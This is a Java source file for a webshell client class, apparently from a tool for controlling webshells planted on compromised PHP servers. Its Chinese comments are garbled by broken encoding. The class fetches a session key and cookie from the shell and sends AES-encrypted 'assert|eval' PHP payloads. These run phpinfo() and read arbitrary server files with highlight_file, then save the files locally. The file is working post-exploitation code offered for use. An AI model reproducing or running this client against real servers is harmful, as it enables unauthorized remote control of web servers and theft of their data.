import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.URLConnection;
import java.security.SecureRandom;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.*;
import java.net.Authenticator;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.InetAddress;
import java.net.SocketAddress;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;

import sun.net.www.protocol.http.AuthCacheImpl;
import sun.net.www.protocol.http.AuthCacheValue;

/*ÿ��webshell����һ��WebShell����*/
public class WebShell{
	private int id; //webshell��id����sqlite�е�id�ֶ���ͬ
	private String url; //webshell��ַ
	private String password; //webshell����
	private String cookie; 
	private String key; /*����payloadʱ����Կ*/
	private String type;/*webshell����*/
	
	WebShell(){}
	
	/*û��id�Ĺ��캯�����½�һ��webshellʱ�����*/
	WebShell(String NewUrl,String NewPass){
		this.id = -1;
		this.url = NewUrl;
		this.password = NewPass;
		this.type = NewUrl.substring(NewUrl.lastIndexOf("."),NewUrl.length());
		//System.out.println(type);
	}
	
	/*��id�Ĺ��캯���������ݿ��е�webshellʵ����ʱ�����*/
	WebShell(int new_id,String NewUrl,String NewPass){
		this.id = new_id;
		this.url = NewUrl;
		this.password = NewPass;
		this.type = NewUrl.substring(NewUrl.lastIndexOf("."),NewUrl.length());
		//System.out.println(type);
	}
	
	public String getUrl() {
		return this.url;
	}
	
	public String getPassword() {
		return this.password;
	}
	
	public String getType() {
		return this.type;
	}
	
	public int getId() {
		return this.id;
	}
	
	public void setUrl(String newurl) {
		this.url = newurl;
		this.type = newurl.substring(newurl.lastIndexOf("."),newurl.length());
	}
	
	public void setPassword(String newpass) {
		this.password = newpass;
	}
	
	public void setId(int new_id) {
		this.id = new_id;
	}
	
	/*
	 * getKeyAndCookie����
	 * ���ڻ����Կ��cookie 
	 * �޸���rebeyond���������(https://xz.aliyun.com/t/2744#toc-8)
	 * ͵����û��http����Ĳ��ַŵ�Request����,��װ�Ĳ����ر��
	 */
	public void getKeyAndCookie() throws Exception {
		String getUrl = url+"?"+password+"=";
	    StringBuffer sb = new StringBuffer();
	    InputStreamReader isr = null;
	    BufferedReader br = null;
	    URL url = new URL(getUrl);
	    URLConnection urlConnection = url.openConnection();

	    this.cookie = urlConnection.getHeaderField("Set-Cookie");
	    isr = new InputStreamReader(urlConnection.getInputStream());
	    br = new BufferedReader(isr);
	    String line;
	    while ((line = br.readLine()) != null) { 
	        sb.append(line);
	    }
	    br.close();
	    this.key = sb.toString();
	}
	
	public String sendPayload(String payload) throws Exception{
		String Data = Decrypt.Encrypt(payload,this.key);//��payload��AES-128-ECB��base64����
		String response = Request.doPost(this.url, Data,this.cookie);
		if(response.equals(""))
			return response;
		return response.substring(response.indexOf("[S]")+3,response.indexOf("[E]"));
	}
	
	public String getInfo() throws Exception{
		String payload = "assert|eval('echo \"[S]\";phpinfo();echo \"[E]\";')";
		this.getKeyAndCookie();
		String html = this.sendPayload(payload);
		//String html = response.substring(response.indexOf("[S]")+3,response.indexOf("[E]"));
		return html;
	}
	
	public void DownLoadFile(String filepath) {
		//System.out.println(filepath);
		String payload = "assert|eval('echo \"[S]\";echo highlight_file(\"" 
		                  + "." + filepath + "\");echo \"[E]\";')";
		System.out.println(payload);
		try{
			String file_content = this.sendPayload(payload);
			FileWriter writer = new FileWriter(filepath.substring(filepath.lastIndexOf("/")+1,filepath.length()), true);  
			writer.write(file_content);
			writer.close();
		}catch(Exception e) {
			System.out.println(e.getMessage());
		}
	} 
}
	
